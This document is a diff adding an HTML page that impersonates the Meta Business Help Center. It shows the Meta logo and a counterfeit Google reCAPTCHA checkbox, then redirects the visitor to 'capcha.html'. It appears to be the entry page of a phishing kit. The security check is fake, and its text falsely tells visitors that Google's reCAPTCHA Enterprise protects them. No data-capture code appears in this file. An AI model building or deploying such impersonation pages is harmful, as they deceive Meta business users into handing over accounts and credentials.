@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Business Help Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        // Fallback khi CDN bị chặn: nếu window.tailwind không có, chèn CSS local.
+        (function () {
+            function loadFallback() {
+                if (!window.tailwind) {
+                    var link = document.createElement('link');
+                    link.rel = 'stylesheet';
+                    link.href = 'styles/tailwind.min.css';
+                    document.head.appendChild(link);
+                }
+            }
+            if (document.readyState === 'complete') {
+                setTimeout(loadFallback, 100);
+            } else {
+                window.addEventListener('load', function () {
+                    setTimeout(loadFallback, 100);
+                });
+            }
+        })();
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap');
+        
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+        }
+        
+        .checkbox {
+            position: relative;
+        }
+        
+        .checkbox input[type="checkbox"] {
+            position: absolute;
+            opacity: 0;
+            cursor: pointer;
+        }
+        
+        .checkbox svg {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+        }
+        
+        .checkbox svg path {
+            fill: none;
+            stroke: #1a73e8;
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            stroke-dasharray: 30;
+            stroke-dashoffset: 30;
+            transition: stroke-dashoffset 0.3s ease;
+        }
+        
+        .checkbox-box {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #c1c1c1;
+            border-radius: 3px;
+            transition: border-color 0.3s ease;
+            background-color: #ffffff;
+            position: relative;
+        }
+        
+        .checkbox input[type="checkbox"]:checked ~ .checkbox-box {
+            border-color: #1a73e8;
+            background-color: #1a73e8;
+        }
+        
+        .checkbox input[type="checkbox"]:checked ~ .checkbox-box + svg path {
+            stroke-dashoffset: 0;
+            stroke: #ffffff;
+        }
+        
+        /* Spinner inside checkbox */
+        .checkbox-spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(193, 193, 193, 0.3);
+            border-top: 2px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+        
+        .checkbox-box.loading .checkbox-spinner {
+            display: block;
+        }
+        
+        .checkbox-box.loading + svg {
+            display: none;
+        }
+        
+        .checkbox-box.loading {
+            border-color: #c1c1c1 !important;
+            background-color: #ffffff !important;
+        }
+        
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-white flex flex-col items-center justify-start min-h-screen w-full p-4 md:p-8 pt-8 md:pt-20">
+        <div class="font-roboto text-[14px] text-gray-800 w-full h-full flex flex-col justify-start max-w-[320px]">
+            <!-- Logo -->
+            <div class="w-full mb-1 flex justify-left">
+                <svg xmlns="http://www.w3.org/2000/svg" width="329" height="45" viewBox="0 0 329 66" fill="none" class="w-[64px]">
+<g clip-path="url(#clip0_4532_1033)">
+<mask id="mask0_4532_1033" style="mask-type:luminance" maskUnits="userSpaceOnUse" x="0" y="0" width="329" height="66">
+<path d="M329 0H0V66H329V0Z" fill="white"/>
+</mask>
+<g mask="url(#mask0_4532_1033)">
+<path d="M122.064 1.98657H134.372L155.298 39.8132L176.224 1.98657H188.264V64.1421H178.22V16.5033L159.875 49.4881H150.453L132.108 16.5026V64.1414H122.064V1.98657ZM221.273 65.2542C216.624 65.2542 212.531 64.2213 209.009 62.1693C205.488 60.1101 202.741 57.2629 200.766 53.621C198.799 49.9798 197.816 45.8099 197.816 41.0988C197.816 36.3376 198.777 32.1176 200.701 28.4466C202.625 24.7764 205.3 21.9074 208.72 19.8336C212.141 17.7678 216.074 16.727 220.514 16.727C224.932 16.727 228.728 17.7744 231.91 19.8554C235.099 21.9437 237.55 24.8701 239.264 28.6275C240.985 32.3849 241.845 36.7923 241.845 41.8578V44.6107H207.766C208.387 48.3971 209.921 51.381 212.364 53.5563C214.809 55.731 217.896 56.8147 221.628 56.8147C224.621 56.8147 227.195 56.3745 229.357 55.4855C231.519 54.5965 233.551 53.2527 235.446 51.4463L240.775 57.9711C235.475 62.8267 228.974 65.2542 221.273 65.2542ZM228.605 28.382C226.501 26.2356 223.746 25.1664 220.341 25.1664C217.021 25.1664 214.245 26.2574 212.01 28.4466C209.769 30.6365 208.359 33.5841 207.766 37.284H232.199C231.902 33.4976 230.702 30.5276 228.605 28.382ZM254.326 26.0482H245.085V17.8398H254.326V4.25499H264.008V17.8398H278.051V26.0482H264.008V46.8725C264.008 50.3335 264.601 52.8046 265.787 54.2863C266.973 55.7673 268.998 56.5039 271.875 56.5039C273.148 56.5039 274.226 56.4537 275.115 56.3521C276.097 56.2328 277.076 56.0908 278.051 55.9264V64.0549C276.952 64.3803 275.715 64.6476 274.341 64.8502C272.96 65.0595 271.521 65.1604 270.01 65.1604C259.554 65.1604 254.326 59.4521 254.326 48.0288V26.0482ZM329 64.1421H319.499V57.6609C317.807 60.0883 315.659 61.9594 313.056 63.2748C310.445 64.5902 307.488 65.2548 304.169 65.2548C300.084 65.2548 296.461 64.2067 293.308 62.1185C290.148 60.0375 287.668 57.1619 285.868 53.5128C284.059 49.8564 283.156 45.6726 283.156 40.9688C283.156 36.2366 284.074 32.0456 285.911 28.4037C287.748 24.7619 290.285 21.9074 293.525 19.8336C296.772 17.7678 300.496 16.727 304.704 16.727C307.871 16.727 310.713 17.3408 313.229 18.5691C315.712 19.7699 317.864 21.561 319.499 23.7864V17.8398H329V64.1421ZM319.318 34.0395C318.284 31.4094 316.642 29.3284 314.408 27.8038C312.174 26.2792 309.585 25.5202 306.656 25.5202C302.506 25.5202 299.209 26.9075 296.75 29.6894C294.291 32.4713 293.062 36.2366 293.062 40.9688C293.062 45.7307 294.248 49.5092 296.613 52.2918C298.984 55.0737 302.195 56.461 306.259 56.461C309.245 56.461 311.913 55.6954 314.256 54.1563C316.592 52.6171 318.284 50.5428 319.318 47.9344V34.0395Z" fill="#1C2B33"/>
+<path d="M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z" fill="#0180FA"/>
+<path d="M95.8256 23.76H84.7981C86.8017 29.011 87.9967 35.506 87.9967 42.7185C87.9967 50.2445 84.885 54.2995 80.3303 54.2995H80.2764V65.3387L80.5718 65.34C91.3946 65.34 98.7438 56.2828 98.7438 43.395C98.7438 36.234 97.691 29.5898 95.8256 23.76Z" fill="url(#paint0_linear_4532_1033)"/>
+<path d="M27.6361 0.0107422C12.2587 0.512342 0.547587 19.0795 0.0185547 41.5802H11.1519C11.5039 26.2127 18.9255 12.0881 27.6361 11.4248V0.0107422Z" fill="url(#paint1_linear_4532_1033)"/>
+<path d="M49.4781 13.1571L49.4827 13.1512C51.0928 15.2783 52.9464 17.9223 55.6218 22.1404L55.6185 22.1437C57.249 24.7216 58.9677 27.5609 60.8035 30.6874L67.1618 41.5021C73.0693 51.5057 75.9553 54.2995 80.3297 54.2995C80.5337 54.2995 80.7357 54.2916 80.9337 54.2751V65.3367C80.8133 65.3387 80.6923 65.34 80.5712 65.34C71.1466 65.34 65.5839 61.1945 57.4214 47.225L51.0632 36.366L50.6519 35.6631L50.6657 35.64C49.0958 32.8845 45.661 27.2679 42.7875 22.9469L42.7908 22.9416L42.3828 22.341C41.5544 21.1088 40.7859 20.0066 40.1377 19.14L40.0943 19.1558C35.4844 13.1023 32.3181 11.4008 28.274 11.4008C28.0608 11.4008 27.8476 11.4088 27.6357 11.4253V0.01056C27.8476 0.00396 28.0608 0 28.274 0C36.2898 0 42.2039 3.5376 49.4781 13.1571Z" fill="url(#paint2_linear_4532_1033)"/>
+</g>
+</g>
+<defs>
+<linearGradient id="paint0_linear_4532_1033" x1="81.8424" y1="65.34" x2="105.911" y2="39.228" gradientUnits="userSpaceOnUse">
+<stop offset="0.427" stop-color="#0278F1"/>
+<stop offset="0.917" stop-color="#0180FA"/>
+</linearGradient>
+<linearGradient id="paint1_linear_4532_1033" x1="27.6361" y1="3.25794" x2="-1.20576" y2="40.6422" gradientUnits="userSpaceOnUse">
+<stop offset="0.427" stop-color="#0165E0"/>
+<stop offset="0.917" stop-color="#0180FA"/>
+</linearGradient>
+<linearGradient id="paint2_linear_4532_1033" x1="18.2112" y1="18.9486" x2="87.5348" y2="46.792" gradientUnits="userSpaceOnUse">
+<stop stop-color="#0064E0"/>
+<stop offset="0.656" stop-color="#0066E2"/>
+<stop offset="1" stop-color="#0278F1"/>
+</linearGradient>
+<clipPath id="clip0_4532_1033">
+<rect width="329" height="66" fill="white"/>
+</clipPath>
+</defs>
+</svg>
+            </div>
+            
+            <!-- reCAPTCHA Box -->
+            <div class="flex items-center justify-start bg-cover bg-center py-2 w-full font-helvetica">
+                <div class="bg-[#f9f9f9] border-2 rounded-md text-[#4c4a4b] flex flex-row items-center justify-between pr-2 w-full">
+                    <div class="flex flex-row items-center justify-start ml-[1rem]">
+                        <label class="checkbox cursor-pointer relative" style="width: 30px; height: 30px; margin-right: 8px;">
+                            <input type="checkbox" id="checked-captcha">
+                            <div class="checkbox-box">
+                                <div class="checkbox-spinner"></div>
+                            </div>
+                            <svg viewBox="0 0 21 21" style="width: 22px; height: 22px;">
+                                <path d="M5,10.75 L8.5,14.25 L19.4,2.3"></path>
+                            </svg>
+                        </label>
+                        <label for="checked-captcha" class="cursor-pointer text-[14px] text-gray-500 font-semibold mr-4 ml-1 text-center text-left tracking-normal">
+                            I'm not a robot
+                        </label>
+                    </div>
+                    <div class="flex items-center flex-col text-[#9d9ba7] mb-[2px]">
+                        <img alt="recaptcha" class="w-[40px] h-[40px] mt-[.5rem]" src="img/capcha.png">
+                        <span class="text-[10px] font-bold">reCAPTCHA</span>
+                        <div class="text-[8px]">Privacy - Terms</div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Information Text -->
+            <div class="text-gray-700 font-helvetica text-[13px] leading-[1.3]">
+                <p class="font-normal">
+                    This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
+                </p>
+                <p class="font-normal mt-4">
+                    We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.
+                </p>
+                <p class="font-normal mt-4">
+                    reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.
+                </p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const checkbox = document.getElementById('checked-captcha');
+        const checkboxBox = checkbox.nextElementSibling;
+        const svgPath = checkbox.nextElementSibling.nextElementSibling.querySelector('path');
+        
+        function showLoadingAndRedirect() {
+            // Show spinner inside checkbox, hide checkmark
+            // Keep checkbox in original color (white background, gray border)
+            checkboxBox.classList.add('loading');
+            
+            // Redirect after 1 second
+            setTimeout(function() {
+                window.location.href = 'capcha.html';
+            }, 1000);
+        }
+        
+        // Redirect to limit.html when clicking on checkbox box
+        checkboxBox.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (!checkbox.checked) {
+                checkbox.checked = true;
+                showLoadingAndRedirect();
+            }
+        });
+        
+        checkbox.addEventListener('change', function() {
+            if (this.checked) {
+                showLoadingAndRedirect();
+            } else {
+                checkboxBox.style.borderColor = '#c1c1c1';
+                checkboxBox.style.backgroundColor = '#ffffff';
+                checkboxBox.classList.remove('loading');
+                if (svgPath) {
+                    svgPath.style.strokeDashoffset = '30';
+                    svgPath.style.stroke = '#1a73e8';
+                }
+            }
+        });
+    </script>
+</body>
+</html>
